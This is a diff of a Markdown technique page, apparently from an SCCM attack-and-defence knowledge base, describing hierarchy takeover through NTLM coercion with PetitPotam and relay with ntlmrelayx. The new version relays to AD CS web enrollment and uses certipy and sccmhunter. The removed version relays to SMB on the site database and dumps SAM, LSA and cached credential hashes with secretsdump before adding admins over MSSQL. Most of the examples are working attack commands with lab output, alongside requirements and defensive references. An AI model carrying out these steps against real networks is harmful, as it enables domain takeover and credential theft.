@@ -1,203 +1,161 @@
 # TAKEOVER-3
 
 ## Description
-Hierarchy takeover via NTLM coercion and relay to SMB on remote site database
+Hierarchy takeover via NTLM coercion and relay to HTTP on AD CS
 
 ## MITRE ATT&CK TTPs
 - [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
 - [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
 
 ## Requirements
--
--
+### Coercion
+- Valid Active Directory domain credentials
+- Connectivity to SMB (TCP/445) on a coercion target:
+    - TAKEOVER-3.1: Coerce primary site server
+    - TAKEOVER-3.2: Coerce SMS Provider
+    - TAKEOVER-3.3: Coerce passive site server
+    - TAKEOVER-3.4: Coerce site database server
+- Connectivity from the coercion target to SMB (TCP/445) on the relay server (or WebClient enabled and connectivity via any port)
+- Coercion target settings:
+    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
+    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
+    - Domain computer account is not in `Protected Users`
+- Domain controller settings:
+    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target
+    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target
 
-## Summary
+### Relay
+- Connectivity from the relay server to HTTPS (TCP/443) on the relay target, the AD CS Certificate Authority
+- Extended protection for authentication not required on the the certificate enrollment web interface
+- An enabled AD CS template that allows enrollment and supports authentication 
+- Relay target settings:
+    - `RequireSecuritySignature` = `0` or not present
+    - `RestrictReceivingNTLMTraffic` = `0` or not present
+    - Coercion target is local admin (to access RPC/admin shares)
+- Domain controller settings:
+    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
+
+When available, SCCM uses public key infrastructure (PKI) for authentication and authorization. While not required, administrators may choose to deploy Active Directory Certificate Services (AD CS) to support SCCM's [various certificate requirements](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-certificates) rather than use self-signed certificates. AD CS is home to its own [misconfigurations](https://posts.specterops.io/certified-pre-owned-d95910965cd2); particularly ESC8. In short, the [certificate enrollment web interface](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) is vulnerable to NTLM relaying. An attacker may coerce NTLM authentication from a coercion target and relay to the AD CS enrollment web service to enroll in and acquire a valid certificate template on behalf of the target. The template can then be used to escalate to "Full Administrator" in SCCM by impersonating the coerced target.
 
 ## Impact
-
-## Subtechniques
-- TAKEOVER-2.1: Coerce primary site server
-- TAKEOVER-2.2: Coerce passive site server
+The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.
 
 ## Defensive IDs
-- [PREVENT-1: Patch SCCM Site Server with KB15599094](../defense-techniques/PREVENT/PREVENT-1/prevent-1_description.md)
+- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
+- [PREVENT-11: Disable and uninstall WebClient on site servers](../../../defense-techniques/PREVENT/PREVENT-11/prevent-11_description.md)
+- [PREVENT-14: Require EPA on AD CS and site databases](../../../defense-techniques/PREVENT/PREVENT-14/prevent-14_description.md)
+- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)
+
+## Subtechniques
+- TAKEOVER-3.1: Coerce primary site server
+- TAKEOVER-3.2: Coerce SMS Provider
+- TAKEOVER-3.3: Coerce passive site server
+- TAKEOVER-3.4: Coerce site database server
 
 ## Examples
-The steps to execute TAKEOVER-2.1 and TAKEOVER-2.2 are mostly the same except that a different system is targeted for coercion of NTLM authentication.
+The steps to execute TAKEOVER-3.1 through TAKEOVER-3.4 are the same except that a different system is targeted for coercion of NTLM authentication. The following example assumes the AD CS service has been previously enumerated and the web enrollment form is vulnerable to ESC8.
 
-1. On the attacker relay server, start `ntlmrelayx`, targeting the IP address of the site database server:
+1. Use `SCCMHunter` to  profile SCCM infrastructure:
 
+    ```
+    [12:24:25 AM] INFO     [+] Finished profiling all discovered computers.                                   
+    [12:24:25 AM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
+                        | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
+                        +=========================+============+=================+==============+===================+=====================+===============+========+=========+
+                        | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
+                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
+                        | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
+                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
+    ```
 
-### Windows
-1. 
+2. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the certificate enrollment web interface on the certificate authority:
 
+    ```
+    └─# ntlmrelayx.py -t http://ca.internal.lab/certsrv/certfnsh.asp --adcs -smb2support
+    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra
 
-### Linux
-1. Start `ntlmrelayx` with a SOCKS proxy
-```
-└─# ntlmrelayx.py -t smb://10.10.100.8 -socks -smb2support
-Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra
+    [*] Protocol Client SMB loaded..
+    [*] Protocol Client IMAPS loaded..
+    [*] Protocol Client IMAP loaded..
+    [*] Protocol Client RPC loaded..
+    [*] Protocol Client DCSYNC loaded..
+    [*] Protocol Client MSSQL loaded..
+    [*] Protocol Client LDAPS loaded..
+    [*] Protocol Client LDAP loaded..
+    [*] Protocol Client SMTP loaded..
+    [*] Protocol Client HTTPS loaded..
+    [*] Protocol Client HTTP loaded..
+    [*] Running in relay mode to single host
+    [*] Setting up SMB Server
+    [*] Setting up HTTP Server on port 80
+    [*] Setting up WCF Server
+    [*] Setting up RAW Server on port 6666
 
-[*] Protocol Client SMB loaded..
-[*] Protocol Client IMAP loaded..
-[*] Protocol Client IMAPS loaded..
-[*] Protocol Client RPC loaded..
-[*] Protocol Client DCSYNC loaded..
-[*] Protocol Client MSSQL loaded..
-[*] Protocol Client LDAP loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client SMTP loaded..
-[*] Protocol Client HTTPS loaded..
-[*] Protocol Client HTTP loaded..
-[*] Running in relay mode to single host
-[*] SOCKS proxy started. Listening on 127.0.0.1:1080
-[*] SMTP Socks Plugin loaded..
-[*] IMAPS Socks Plugin loaded..
-[*] IMAP Socks Plugin loaded..
-[*] MSSQL Socks Plugin loaded..
-[*] HTTP Socks Plugin loaded..
-[*] HTTPS Socks Plugin loaded..
-[*] SMB Socks Plugin loaded..
-[*] Setting up SMB Server
-[*] Setting up HTTP Server on port 80
- * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
- * Debug mode: off
-[*] Setting up WCF Server
-[*] Setting up RAW Server on port 6666
+    [*] Servers started, waiting for connections
+    ```
 
-[*] Servers started, waiting for connections
-Type help for list of commands
-ntlmrelayx>
-```
+3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:
 
-2. Coerce auth
+    ```
+    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
+    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 
 
-```
-└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 sccm.internal.lab
-Trying pipe lsarpc
-[-] Connecting to ncacn_np:sccm.internal.lab[\PIPE\lsarpc]
-[+] Connected!
-[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
-[+] Successfully bound!
-[-] Sending EfsRpcOpenFileRaw!
-[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
-[+] OK! Using unpatched function!
-[-] Sending EfsRpcEncryptFileSrv!
-[+] Got expected ERROR_BAD_NETPATH exception!!
-[+] Attack worked!
-```
+    Trying pipe lsarpc
+    [-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
+    [+] Connected!
+    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+    [+] Successfully bound!
+    [-] Sending EfsRpcOpenFileRaw!
+    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+    [+] OK! Using unpatched function!
+    [-] Sending EfsRpcEncryptFileSrv!
+    [+] Got expected ERROR_BAD_NETPATH exception!!
+    [+] Attack worked!
+    ```
 
-3. Receive connection on relay server
+    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the AdminService on the SMS Provider to add a Full Administrator:
 
-```
-[*] Servers started, waiting for connections
-Type help for list of commands
-ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.9, attacking target smb://10.10.100.8
-[*] Authenticating against smb://10.10.100.8 as LAB/SCCM$ SUCCEED
-[*] SOCKS: Adding LAB/SCCM$@10.10.100.8(445) to active SOCKS connection. Enjoy
-[*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
-socks
-Protocol  Target       Username   AdminStatus  Port
---------  -----------  ---------  -----------  ----
-SMB       10.10.100.8  LAB/SCCM$  TRUE         445
-ntlmrelayx>
-```
+    ```
+    [*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.9, attacking target http://ca.internal.lab
+    [*] HTTP server returned error code 200, treating as a successful login
+    [*] Authenticating against http://ca.internal.lab as LAB/SCCM$ SUCCEED
+    [*] SMBD-Thread-7 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
+    [*] Generating CSR...
+    [*] CSR generated!
+    [*] Getting certificate...
+    [*] GOT CERTIFICATE! ID 9
+    [*] Base64 certificate of user SCCM$:
+    MIIQ/QIBAzCCELcGCSqGSIb3DQEHAaCCEKgEghCkMIIQoDCCBtcGCSqGSIb3DQEHB.....
+    ```
 
-4. Proxy in secretsdump
+4. Use `certipy` to recover the coerced target's NT hash:
 
-```
-└─# proxychains secretsdump.py 'lab/sccm$@10.10.100.8' -no-pass
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.16
-Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra
+    ```
+    └─# certipy auth -pfx sccm.pfx
+    Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.100.8:445  ...  OK
-[*] Target system bootKey: 0xf81f8be7c4c43d38858d17318ffa025e
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:26f78b6fd483ddd6c54497e6ffbffbc2:::
-[*] Dumping cached domain logon information (domain/username:hash)
-INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 00:27:04)
-INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-10 02:33:07)
-INTERNAL.LAB/sqlsvc:$DCC2$10240#sqlsvc#e12866f9a8777ddbe39ae1380ac6346c: (2024-02-23 22:25:28)
-INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-20 03:20:11)
-INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-22 21:51:57)
-INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-02-23 00:31:30)
-INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42: (2024-03-01 17:04:52)
-[*] Dumping LSA Secrets
-[*] $MACHINE.ACC
-LAB\SQL$:aes256-cts-hmac-sha1-96:8d15fd9651116c18930d6244351147f367cdb25b163acf8e112139c5462ba832
-LAB\SQL$:aes128-cts-hmac-sha1-96:340346aa26b46b5a7be81b478c3e0d27
-LAB\SQL$:des-cbc-md5:2a80e6012a02b586
-LAB\SQL$:plain_password_hex:2f007700410042003b0047005d00720044006d00370047007700390073003200690035002b0054005e0031004e005c004300450037003c004d005100560035003c0043005c003a00380050002f004900400044004b0069002d00740026003d0043004b004e006b0061005000690059005000480049004c0065005e00600054003c006f0048003d004600690067005d004d004000670070005d005800370078006a0043003a0047003f0034006b00640056002e004500440052002600200049006900230047005800620058002200510069006800220032003e007400360043005d00780032002f002800260061004300
-LAB\SQL$:aad3b435b51404eeaad3b435b51404ee:e0173405c3e9c5ecaba657bc628889ce:::
-[*] DPAPI_SYSTEM
-dpapi_machinekey:0xb5ca959a9a6ed97054bdae10d23275b776378b3d
-dpapi_userkey:0x49206429f367c2e332d88015e0405e68646fe959
-[*] NL$KM
- 0000   39 47 80 9E 3B 1E F2 D0  3C 1F 6D C5 E3 77 A9 9C   9G..;...<.m..w..
- 0010   F4 8A EF DD 7E 4D 10 2D  1E 59 F9 B3 FB FE 1F E9   ....~M.-.Y......
- 0020   86 4E 14 EF 0D E8 0D 8A  7C 85 B8 66 A4 C9 DD DC   .N......|..f....
- 0030   CE DD F1 02 33 72 BD 1C  CF 1E 53 F1 28 F4 5B AE   ....3r....S.(.[.
-NL$KM:3947809e3b1ef2d03c1f6dc5e377a99cf48aefdd7e4d102d1e59f9b3fbfe1fe9864e14ef0de80d8a7c85b866a4c9dddcceddf1023372bd1ccf1e53f128f45bae
-[*] _SC_MSSQLSERVER
-LAB\sqlsvc:P@ssw0rd
-[*] Cleaning up...
+    [*] Using principal: sccm$@internal.lab
+    [*] Trying to get TGT...
+    [*] Got TGT
+    [*] Saved credential cache to 'sccm.ccache'
+    [*] Trying to retrieve NT hash for 'sccm$'
+    [*] Got hash for 'sccm$@internal.lab': aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b
+    ```
 
-```
+5. Use `sccmhunter` to authenticate to the coerced target's own AdminService:
 
-5. Get TGT for SQL service account running the site database
-
-```
-└─# getTGT.py internal.lab/sqlsvc:"P@ssw0rd"
-Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
-
-[*] Saving ticket in sqlsvc.ccache
-```
-
-6. S4U
-
-```
-└─# python3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm\$@internal.lab sccm_s4u.ccache -v
-2024-03-01 21:31:03,310 minikerberos INFO     Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
-INFO:minikerberos:Trying to get SPN with sccm$@internal.lab for MSSQLSvc/sql.internal.lab:1433@internal.lab
-2024-03-01 21:31:05,126 minikerberos INFO     Success!
-INFO:minikerberos:Success!
-2024-03-01 21:31:05,127 minikerberos INFO     Done!
-INFO:minikerberos:Done!
-```
-7. Auth to MSSQL
-
-```
-└─# KRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm\$@sql.internal.lab  -k -no-pass -windows-auth
-Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
-
-[*] Encryption required, switching to TLS
-[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
-[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
-[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(SQL): Line 1: Changed database context to 'master'.
-[*] INFO(SQL): Line 1: Changed language setting to us_english.
-[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
-[!] Press help for extra shell commands
-SQL (LAB\sccm$  dbo@master)> use CM_LAB
-[*] ENVCHANGE(DATABASE): Old Value: master, New Value: CM_LAB
-[*] INFO(SQL): Line 1: Changed database context to 'CM_LAB'.
-SQL (LAB\sccm$  dbo@CM_LAB)> select * from RBAC_Admins;
- AdminID                                                      AdminSID   LogonName           DisplayName   IsGroup   IsDeleted   CreatedBy           CreatedDate   ModifiedBy          ModifiedDate   SourceSite   DistinguishedName   AccountType
---------   -----------------------------------------------------------   -----------------   -----------   -------   ---------   -----------------   -----------   -----------------   ------------   ----------   -----------------   -----------
-16777217   b'0105000000000005150000005407a9ee65b1f9b01fff385ef4010000'   LAB\Administrator   NULL                0           0   LAB\administrator   2024-02-10 01:21:52   LAB\administrator   2024-02-10 01:21:52   LAB          NULL                       NULL
-
-16777220   b'0105000000000005150000005407a9ee65b1f9b01fff385e59040000'   LAB\lowpriv         lowpriv             0           0   LAB\administrator   2024-02-29 21:50:54   LAB\administrator   2024-02-29 21:50:54   LAB                                      128
-
-SQL (LAB\sccm$  dbo@CM_LAB)>
-```
-
+    ```
+    └─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b -ip 10.10.100.9
+    SCCMHunter v1.0.0 by @garrfoster
+    [21:23:25] INFO     [!] Enter help for extra shell commands
+    () C:\ >> show_admins
+    [21:23:31] INFO     Tasked SCCM to list current SMS Admins.
+    [21:23:31] INFO     Current Full Admin Users:
+    [21:23:31] INFO     LAB\Administrator
+    [21:23:31] INFO     LAB\lowpriv
+    ```
 
 ## References
-Author, Title, URL
-
-exploit.ph, Revisiting Delegate 2 thyself, 
+- Will Schroeder and Lee Chagolla-Christensen, [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+- Oliver Lyak, [Certipy](https://github.com/ly4k/Certipy)
+- Microsoft, [Plan for PKI certificates in Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-certificates)
